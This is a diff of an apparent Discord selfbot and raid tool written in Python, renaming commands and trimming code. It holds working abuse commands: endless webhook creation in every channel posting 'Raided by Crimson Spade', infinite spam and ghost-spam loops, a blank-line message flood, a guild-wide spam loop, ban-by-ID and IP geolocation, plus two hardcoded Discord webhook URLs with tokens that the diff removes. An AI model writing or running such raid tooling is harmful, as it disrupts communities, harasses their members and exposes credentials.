@@ -21,26 +21,20 @@ from colorama import Fore as C, Style as S
 import requests as req
 import aiohttp
 from threading import Thread as thr
-import discord
 from discord.ext.commands import *
 from discord.ext import commands, tasks
-import random
 import asyncio
 import datetime
 import os
-from random import randint
 import time
 import json
 from discord import Permissions
-import base64
-import string
 import praw
 import colorama
 from colorama import Fore, Style, init
 from discord.ext.commands import Bot
 from urllib.parse import urlencode
 import urllib.parse, urllib.request, requests, aiohttp
-import codecs
 from discord.utils import get
 import string
 import subprocess
@@ -78,10 +72,6 @@ async def on_connect():
   Logged in as: {bot.user.name} #{bot.user.discriminator}
   {Fore.RESET}
   """)
-  
-
-webhooks = ["https://discord.com/api/webhooks/720872777489317989/ZnY0uPw270WZVFYaAgIk7NYhv_5HIJJTy_pM9mV9M7Ljd5hHbZTnMT5XTTd3IKzarvSZ", "https://discord.com/api/webhooks/712526478868217897/hiJnKiG4rYGQ4LugPXgW6KBjIlk085Ie0WypxrbyS02_jeJLDdvlyFDrbFbpi7FavDzF"]
-
 
 @bot.command() 
 async def whspam(ctx):
@@ -89,20 +79,13 @@ async def whspam(ctx):
  while True:
   async with aiohttp.ClientSession() as session:
     for channel in guild.channels:
-      webhook = await channel.create_webhook(name='Crimson Spade',avatar=img)
+      webhook = await channel.create_webhook(name='Crimson Spade')
       await webhook.send("Raided by Crimson Spade")
-      await webhook.delete()
-
+      
 @bot.command()
 async def serverowner(ctx):
   await ctx.message.delete()
   await ctx.send(ctx.guild.owner)
-  
-@bot.command()
-async def logout(message):
-  await message.delete()
-  await client.logout()
-  print(f"{Color.RED}[{datetime.datetime.now()} UTC]\n{Color.RED}Client has successfully logged out.")
   
   
 @bot.command()
@@ -110,40 +93,40 @@ async def accinfo(ctx, member = None):
   await ctx.message.delete()
   if member is None:
     member = ctx.author
-    embed = discord.Embed(title = f"User Info - **{member.name}#{member.discriminator}**", timestamp=ctx.message.created_at, colour=bot.user.color)
-    embed.add_field(name = "User ID", value = member.id, inline = False)
-    embed.add_field(name = "Account Creation Date", value = member.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), inline = False)
-    embed.add_field(name = "Bot?", value = member.bot, inline = False)
+    embed = discord.Embed(title = f"Info - **{member.name}#{member.discriminator}**", timestamp=ctx.message.created_at, colour=bot.user.color)
+    embed.add_field(name = "ID", value = member.id, inline = False)
+    embed.add_field(name = "DOC", value = member.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), inline = False)
+    embed.add_field(name = "Bot", value = member.bot, inline = False)
     embed.set_image(url = member.avatar_url)
   else:
     member = await bot.fetch_user(member)
-    embed = discord.Embed(title = f"User Info - **{member.name}#{member.discriminator}**", timestamp=ctx.message.created_at, colour=bot.user.color)
-    embed.add_field(name = "User ID", value = member.id, inline = False)
-    embed.add_field(name = "Account Creation Date", value = member.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), inline = False)
-    embed.add_field(name = "Bot?", value = member.bot, inline = False)
+    embed = discord.Embed(title = f"Info - **{member.name}#{member.discriminator}**", timestamp=ctx.message.created_at, colour=bot.user.color)
+    embed.add_field(name = "ID", value = member.id, inline = False)
+    embed.add_field(name = "DOC", value = member.created_at.__format__('%A, %d. %B %Y @ %H:%M:%S'), inline = False)
+    embed.add_field(name = "Bot", value = member.bot, inline = False)
     embed.set_image(url = member.avatar_url)
   
   await ctx.channel.send(embed=embed)
   
   
 @bot.command()
-async def guildinfo(ctx, guild : int):
+async def gi(ctx, guild : int):
   await ctx.message.delete()
   guild = await bot.fetch_guild(guild)
   embed = discord.Embed(title = f"Guild Info - {guild.name}")
-  embed.add_field(name = "Guild ID", value = guild.id, inline = False)
-  embed.add_field(name = "Guild Owner", value = f"``{guild.owner.name}#{guild.owner.discriminator}`` ({guild.owner.id})", inline = False)
-  embed.add_field(name = "Guild Icon", value = f"[Click Here]({guild.icon_url})", inline = False)
+  embed.add_field(name = "Server Identification", value = guild.id, inline = False)
+  embed.add_field(name = "Server Owner", value = f"``{guild.owner.name}#{guild.owner.discriminator}`` ({guild.owner.id})", inline = False)
+  embed.add_field(name = "Server Avatar", value = f"[Click Here]({guild.icon_url})", inline = False)
   embed.set_image(url = guild.icon_url)
   
   
 @bot.command()
-async def hackban(ctx, member_id, *, reason=None):
+async def pb(ctx, member_id, *, reason=None):
   await ctx.message.delete()
   member = discord.Object(id=member_id)
   await ctx.guild.ban(member, reason = reason)
   member = await bot.fetch_user(member_id)
-  await ctx.channel.send(f"Hackbanned ``{member.name}#{member.discriminator}`` for ``{reason}``! :thumbsup:")
+  await ctx.channel.send(f"Prebanned ``{member.name}#{member.discriminator}`` for ``{reason}``! :sunglasses:")
   
 @bot.command()
 async def geolocate(ctx, *, ipaddr: str = '1.3.3.7'): # 
@@ -167,70 +150,35 @@ async def geolocate(ctx, *, ipaddr: str = '1.3.3.7'): #
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em) 
-
-  
+ 
 @bot.command()
-async def b64encode(ctx, *, string): # 
+async def at(ctx, *, text): # 
    await ctx.message.delete()
-   decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
-   encoded_stuff = str(decoded_stuff)
-   encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
-   await ctx.send(encoded_stuff)
-    
-@bot.command()
-async def b64decode(ctx, *, string): #  +
-   await ctx.message.delete() 
-   strOne = (string).encode("ascii")
-   pad = len(strOne)%4
-   strOne += b"="*pad
-   encoded = codecs.decode(strOne.strip(),'base64')
-   decoded = str(encoded_stuff)
-   decoded = decoded[2:len(decoded)-1]
-   await ctx.send(decoded)
-  
-@bot.command()
-async def ascii(ctx, *, text): # 
-   await ctx.message.delete()
-   r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
+   r = requests.get(f'http://patorjk.com/software/taag/#p=display&f=Graffiti&t={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")
-  
+ 
 @bot.command()
-async def blankbomb(ctx): # 
+async def bb(ctx): # 
    await ctx.message.delete()
-   await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')
-  
-@bot.command(pass_context=True)
-async def avatar(ctx, member: discord.Member):
- member = ctx.author if not member else member
- embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)
- embed.set_author(name=f"Avatar for {member}")
- embed.set_thumbnail(url=member.avatar_url)
- await ctx.send(embed=embed)
-async def logout(message):
-  await message.delete()
-  await client.logout()
-  print(f"{Color.RED}[{datetime.datetime.now()} UTC]\n{Color.GREEN}Client has successfully logged out.")
-  
-@bot.command()
-async def hastebin(ctx, *, message): # 
-   await ctx.message.delete()
-   r = requests.post("https://hastebin.com/documents", data=message).json()
-   await ctx.send(f"<https://hastebin.com/{r['key']}>") 
+   await ctx.send('ﾠﾠ'+'\n' * 500 + 'ﾠﾠ')
 
-@bot.command(aliases=['gspam', 'gs'])
-async def ghostspam(ctx, *, message):
+@bot.command()
+async def gs(ctx, *, message):
+   await ctx.message.delete()
   while True:
-    await ctx.send(message, delete_after = 0)
+    await ctx.send(message, delete_after = 0.5)
     
 @bot.command()
-async def spam(ctx, *, message):
+async def s(ctx, *, message):
+   await ctx.message.delete()
   while True:
     await ctx.send(message)
-
+                  
+                  
 @bot.command()
-async def spamall(ctx, *, message):
+async def sa(ctx, *, message):
  await ctx.message.delete()
  guild = ctx.guild
  while True:
